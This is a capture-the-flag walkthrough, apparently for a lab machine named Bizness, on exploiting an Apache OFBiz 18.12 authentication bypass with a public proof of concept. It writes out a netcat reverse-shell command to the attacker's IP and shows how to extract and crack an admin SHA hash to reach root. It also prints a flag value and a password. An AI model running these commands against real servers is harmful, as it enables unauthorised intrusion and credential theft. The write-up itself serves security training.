== Introduction

.Challenge Description

A vulnerable Linux web server that uses OFBiz for hosting.

== Methodology

Use *nmap* to scan the server.
Get a reverse shell on the server.
Privilege escalate to root if possible.

=== Reconnaissance

Scan with nmap

----

OpenSSH 8.4p1 doesn't seem to be vulnerable.
However, upon opening the web address of the server, it redirects to ``bizness.htb``.

The issue is that the page would not load.

This can be fixed by adding this to the ``/etc/hosts`` file

----
10.10.11.252 bizness.htb
----

Greeted with the homepage, there are various forms in the website that might be vulnerable to SQL Injection.

.Bizness Homepage
image::bizness/homepage.png[]

It appears that the server is hosted using https://ofbiz.apache.org[OFBiz] which can be seen at the bottom of the page.

Default path for accessing the control page for OFBiz is located at ``/webtools`` which redirects to ``/webtools/control/main``.
The full path is ``bizness.htb/webtools/control/main``.

.OFBiz webtools
image::bizness/ofbiz.png[]

OFBiz uses version *18.12* which might hint that there are security vulnerabilities that might have existed.
Fortunately for this challenge, there are two severe vulnerabilities:

. CVE-2023-49070
. CVE-2023-51467

For the sake of accomplishing this challenge as fast as possible, I have taken a look at PoCs and found a way to bypass the security login.
I used https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass[this exploit].

=== Exploitation

First create a connection for the reverse shell to connect to

----
$ nc -lvnp 6969 <.>
----
<.> Pick any port you like

Then execute the exploit downloaded on another terminal

----
$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
----
<.> Make sure to point the server to your machine's IP address

On the netcat terminal, this should be printed on the screen

----
listening on [any] 6969 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.252] 49924
----

And we're in!

That can be verified with these commands

----
$ whoami
ofbiz
$pwd
/opt/ofbiz
----

== Finding The Flag

The current directory apparently have tons of files and it would be difficult to find the root flag.

Finding the user flag is quite easy, simply print it out

----
$ cat ~/user.txt
2ecc953f42e90c7a284fcab56f26867e
----

As for the root flag, it's located in ``/root/root.txt`` however the current user (ofbiz) does not have permissions to read, write, and execute on that directory.

It's painful to dumpster dive the password of the root user.
It's not located in the Dockerfile nor in the configurations.

There is however an encrypted password in the file ``/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml``.

[, xml]
----
$ cat AdminUserLoginData.xml

<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/> <.>
    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
</entity-engine-xml>
----
<.> This line contains a SHA password.

However, I do not see any use or a way to crack the password.

Upon further reading about Apache's OFBiz, the password is stored as plaintext as SHA hash somewhere in the ``./runtime/data`` directory.

Since I am lazy, I proceeded to simply print the strings of each and every file that contains a *SHA*.

----
$ cd ./runtime/data/derby/ofbiz/seg0
$ strings * | grep SHA

"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I <.>

----
<.> We found are root password hashed with SHA.

== Cracking the Root Flag

Certainly, I can code my own tool for cracking the hashed password using a wordlist dictionary but someone else have already created that tool for us to use.
Can be accessed https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker[here].

I used *rockyou.txt* as my wordlist.

After cracking the SHA hash, we should now acquire the password.

== Get Root Flag

Login with root

----
$ su
Password: monkeybizness
----

Check if we truly are root

----
# whoami
root
----

Acquire the root flag

----
# cat /root/root.txt

== Challenge Summaries

Extract the archive with ``tar``

Use an existing tool to exploit Apache's OFBiz 18.12

----
$ python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.20 6969' <.>
----

Get the user flag

----
$ cat ~/user.txt
2ecc953f42e90c7a284fcab56f26867e
----

Crack the SHA hash then get the root flag

----
$ cd ./runtime/data/derby/ofbiz/seg0
$ strings * | grep SHA

== Lessons Learned

. Apache's OFBiz
. Searching for existing exploits

== Conclusion

Not a fun challenge when you have to search the files one by one when you do not have experience with OFBiz.
I don't wanna do this shit again.
